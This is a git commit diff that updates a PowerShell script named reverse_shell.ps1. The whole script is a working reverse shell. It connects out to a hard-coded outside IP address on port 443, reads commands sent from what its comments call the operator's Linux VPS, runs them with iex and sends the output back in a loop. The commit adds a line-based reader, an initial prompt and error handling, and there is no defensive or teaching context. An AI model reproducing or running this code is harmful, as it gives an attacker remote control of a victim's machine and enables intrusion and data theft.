b8b9fb0f4668f53801032da3e9ec80fe7461c912
1tsMeMario <91571045+1tsMeMario@users.noreply.github.com>
2024-08-30 15:17:11 -0500

    Update reverse_shell.ps1

--- reverse_shell.ps1
+++ reverse_shell.ps1
@@ -1,16 +1,31 @@
+# Establish a TCP connection to your Linux VPS
 $client = New-Object System.Net.Sockets.TCPClient("62.72.26.25", 443);
 $stream = $client.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
+$reader = new-object System.IO.StreamReader($stream);
 $buffer = new-object System.Byte[] 1024;
 $encoding = new-object System.Text.AsciiEncoding;
 
-while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
-    $data = $encoding.GetString($buffer, 0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
-    $writer.Write($encoding.GetBytes($sendback2),0,$sendback2.Length);
-    $writer.Flush();
-}
+# Send an initial prompt
+$writer.Write($encoding.GetBytes("PS " + (pwd).Path + "> "));
+$writer.Flush();
 
-$writer.Close();
-$client.Close();
+# Continuously read and execute commands from the Linux VPS
+while($true) {
+    try {
+        $data = $reader.ReadLine();
+        if ($data) {
+            # Execute the command and capture the output
+            $sendback = (iex $data 2>&1 | Out-String);
+            $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+            # Send the output back to the Linux VPS
+            $writer.Write($encoding.GetBytes($sendback2), 0, $sendback2.Length);
+            $writer.Flush();
+        }
+    } catch {
+        # Close the connection if an error occurs
+        $writer.Close();
+        $client.Close();
+        break;
+    }
+}
